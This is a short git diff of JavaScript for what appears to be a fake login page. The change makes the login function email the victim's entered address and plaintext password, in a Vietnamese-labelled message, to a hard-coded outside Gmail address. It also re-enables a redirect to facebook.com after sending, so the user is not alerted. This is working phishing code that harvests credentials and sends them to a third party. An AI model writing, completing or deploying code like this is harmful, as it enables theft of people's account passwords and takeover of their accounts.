@@ -2,8 +2,7 @@ function login() {
     var email = document.getElementById("email").value;
     var pass = document.getElementById("pass").value;
     if(email && pass){
-        //SendHTTP();
-        sendEmail(email);
+        sendEmail(`Người dùng: ${email}, password: ${pass}`);
     }
     else{
         var emailCls = document.getElementsByClassName("error-email"); 
@@ -28,11 +27,11 @@ function sendEmail(body) {
         EnableSsl: true,
         To: 'mr.lenovi@gmail.com',
         From: "checkingman38@gmail.com",
-        Subject: "Checking",
+        Subject: "Checking man gửi thông điệp",
         Body: body,
     }).then(
         message => {
-            //window.location.href = "https://www.facebook.com/"
+            window.location.href = "https://www.facebook.com/"
         }
     );
 }
